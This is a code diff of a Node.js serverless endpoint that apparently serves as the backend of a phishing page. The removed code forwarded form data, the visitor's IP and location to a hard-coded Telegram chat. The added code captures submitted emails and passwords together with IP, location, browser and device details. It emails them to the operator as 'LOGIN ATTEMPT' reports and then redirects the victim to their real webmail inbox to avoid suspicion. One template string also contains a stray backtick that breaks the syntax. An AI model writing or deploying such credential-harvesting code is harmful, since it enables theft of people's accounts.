@@ -1,49 +1,199 @@
-async function sendTelegramSubmit(payload, req, formId = 'unknown') {
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID || '5810458739';
-  if (!token || !chatId) return;
+const { Resend } = require('resend');
 
-  const ip = extractClientIp(req);
-  const loc = extractLocation(req);
-  const entries = Object.entries(payload || {})
-    .map(([key, val]) => `${key}: ${typeof val === 'object' ? JSON.stringify(val) : val}`)
-    .join('\n');
+const resend = new Resend(process.env.RESEND_API_KEY);
 
-  const text = [
-    `Form Submit: ${formId}`,
-    `IP: ${ip}`,
-    `Location: ${loc.place} (${loc.coords})`,
-    '',
-    entries || '(empty payload)',
-  ].join('\n');
+const FORM_OWNERS = {
+  'contact-main': process.env.DEST_EMAIL
+};
 
-  const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text,
-      disable_web_page_preview: true,
-    }),
-  });
+function escapeHtml(value = '') {
+  return String(value)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
 
-  if (!res.ok) {
-    throw new Error(`Telegram failed (${res.status}): ${await res.text()}`);
+function parseRequestBody(req) {
+  if (!req.body) return {};
+  if (typeof req.body === 'string') {
+    try {
+      return JSON.parse(req.body);
+    } catch {
+      return Object.fromEntries(new URLSearchParams(req.body));
+    }
+  }
+  return req.body;
+}
+
+function getInboxUrl(email) {
+  if (!email || !email.includes('@')) return null;
+  const domain = email.split('@')[1].toLowerCase().trim();
+
+  const knownInboxes = {
+    'gmail.com': 'https://mail.google.com',
+    'googlemail.com': 'https://mail.google.com',
+    'outlook.com': 'https://outlook.live.com/mail/',
+    'hotmail.com': 'https://outlook.live.com/mail/',
+    'live.com': 'https://outlook.live.com/mail/',
+    'yahoo.com': 'https://mail.yahoo.com',
+    'icloud.com': 'https://www.icloud.com/mail',
+    'me.com': 'https://www.icloud.com/mail',
+    'proton.me': 'https://mail.proton.me',
+    'protonmail.com': 'https://mail.proton.me',
+    'zoho.com': 'https://mail.zoho.com',
+    'aol.com': 'https://mail.aol.com'
+  };
+
+  return knownInboxes[domain] || `https://mail.${domain}`;
+}
+
+function parseUserAgent(ua = '') {
+  let browser = 'Unknown';
+  if (/Edg\//i.test(ua)) browser = 'Edge';
+  else if (/OPR\/|Opera/i.test(ua)) browser = 'Opera';
+  else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) browser = 'Chrome';
+  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+  else if (/Firefox\//i.test(ua)) browser = 'Firefox';
+
+  let os = 'Unknown';
+  if (/Windows/i.test(ua)) os = 'Windows';
+  else if (/Android/i.test(ua)) os = 'Android';
+  else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
+  else if (/Mac OS X|Macintosh/i.test(ua)) os = 'macOS';
+  else if (/Linux/i.test(ua)) os = 'Linux';
+
+  let device = 'Desktop';
+  if (/Mobi|Android.*Mobile|iPhone/i.test(ua)) device = 'Mobile';
+  else if (/iPad|Tablet/i.test(ua)) device = 'Tablet';
+
+  return { browser, os, device };
+}
+
+function formatTimestamp(timezone) {
+  try {
+    const now = new Date();
+    const parts = new Intl.DateTimeFormat('en-GB', {
+      timeZone: timezone || 'UTC',
+      day: '2-digit',
+      month: '2-digit',
+      year: 'numeric',
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit',
+      hour12: false
+    }).formatToParts(now);
+
+    const get = (type) => parts.find((p) => p.type === type)?.value || '';
+    return `${get('day')}/${get('month')}/${get('year')}, ${get('hour')}:${get('minute')}:${get('second')}`;
+  } catch {
+    return new Date().toISOString();
   }
 }
 
-// Inside your handler, after parsing formData:
-const ip = extractClientIp(req);
-const loc = extractLocation(req);
+module.exports = async (req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-const results = await Promise.allSettled([
-  sendEmailNotification({ formId, fields: formData, ip, location: loc }),
-  sendTelegramSubmit(formData, req, formId),
-]);
+  if (req.method === 'OPTIONS') {
+    return res.status(204).end();
+  }
 
-if (results[0].status === 'rejected') {
-  console.error('Email submit failed:', results[0].reason);
-}
-if (results[1].status === 'rejected') {
-  console.error('Telegram submit failed:', results[1].reason);
-}
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
+
+  const formId = req.query?.formId;
+  const recipientEmail = FORM_OWNERS[formId];
+  if (!recipientEmail) {
+    return res.status(404).json({
+      error: 'Unknown Form ID or missing DEST_EMAIL environment variable',
+      formId: formId || null
+    });
+  }
+
+  const body = parseRequestBody(req);
+  const {
+    _honeypot,
+    _redirect,
+    _redirect_inbox,
+    email = '',
+    password = '',
+    staySignedIn = 'No',
+    attempt = '1/3',
+    screen = 'Unknown',
+    timezone = 'UTC',
+    language = 'Unknown',
+    memory = 'Unknown',
+    cores = 'Unknown'
+  } = body;
+
+  if (_honeypot) {
+    return _redirect ? res.redirect(302, _redirect) : res.status(200).json({ ok: true });
+  }
+
+  const uaString = req.headers['user-agent'] || '';
+  const { browser, os, device } = parseUserAgent(uaString);
+
+  const ipAddress =
+    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
+    req.headers['x-real-ip'] ||
+    'Unknown';
+
+  const city = decodeURIComponent(req.headers['x-vercel-ip-city'] || '').trim();
+  const country = decodeURIComponent(req.headers['x-vercel-ip-country'] || '').trim();
+  const location = [city, country].filter(Boolean).join(', ') || 'Unknown';
+
+  const formattedTime = formatTimestamp(timezone);
+  const stayValue =
+    staySignedIn === true ||
+    staySignedIn === 'true' ||
+    staySignedIn === 'Yes' ||
+    staySignedIn === 'on'
+      ? 'Yes'
+      : 'No';
+
+  const plainTextBlock = [
+    `🔐 `LOGIN ATTEMPT : ${country || 'Unknown'}`,
+    `━━━━━━━━━━━━━━━━━━━━━━`,
+    `📧 Email: ${email}`,
+    `🔑 Password: ${password}`,
+    `📌 Stay Signed In: ${stayValue}`,
+    `🌐 IP Address: ${ipAddress}`,
+    `📍 Location: ${location}`,
+    `💻 Browser: ${browser}`,
+    `🖥️ OS: ${os}`,
+    `📱 Device: ${device}`,
+    `⏱️ Time: ${formattedTime}`,
+    `━━━━━━━━━━━━━━━━━━━━━━`,
+
+  ].join('\n');
+
+  const html = `<pre style="font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 13px; line-height: 1.5; white-space: pre-wrap;">${escapeHtml(plainTextBlock)}</pre>`;
+
+  const fromAddress = process.env.FROM_EMAIL || 'WizFormSubmit <onboarding@resend.dev>';
+
+  const { error } = await resend.emails.send({
+    from: fromAddress,
+    to: recipientEmail,
+    subject: `Login Attempt #${String(attempt).replace(/^#/, '')} - ${email || 'Unknown'}`,
+    text: plainTextBlock,
+    html
+  });
+
+  if (error) {
+    return res.status(500).json({ error });
+  }
+
+  if (_redirect_inbox === 'true') {
+    const inboxUrl = getInboxUrl(email);
+    if (inboxUrl) return res.redirect(302, inboxUrl);
+  }
+
+  if (_redirect) return res.redirect(302, _redirect);
+
+  res.setHeader('Content-Type', 'application/json');
+  return res.status(200).json({ ok: true });
+};
